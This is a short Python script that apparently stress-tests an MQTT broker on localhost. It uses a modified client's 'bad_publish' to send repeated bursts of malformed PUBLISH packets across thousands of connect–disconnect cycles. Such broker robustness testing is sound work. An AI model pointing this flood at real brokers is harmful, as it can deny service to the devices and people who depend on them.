import testpaho.mqtt.client as mqtt
from time import sleep
import random, string


def send_pubs(client, host, port, npkts, clean_session, topic):
    client._clean_session = clean_session
    client.connect(host, port)
    # client.loop_start()

    # send messages
    for _ in range(npkts):
        client.bad_publish(topic, 'bad message')

    # client.loop_stop()
    client.disconnect()


def gen_cli_id(size):
    return ''.join([random.choice(string.ascii_letters + string.digits) \
                    for n in range(size)])


def flood(host, port, topic):
    repetitions = 10 # number of connects/disconnects (each sending npkts)
    npkts = 20 # default maximum number of PUBLISHES accepted by broker

    client = mqtt.Client(gen_cli_id(10))
    client.connect(host, port)

    # subscribe to same topic we will publish
    # client.subscribe(topic)

    send_pubs(client, host, port, npkts, True, topic)
    for i in range(repetitions):
        # needs to be false for other calls
        send_pubs(client, host, port, npkts, False, topic)


if __name__ == '__main__':
    host = 'localhost'
    port = 1883
    topic = 'test'
    total_messages = 1000000

    for _ in range(total_messages//100):
        flood(host, port, topic)

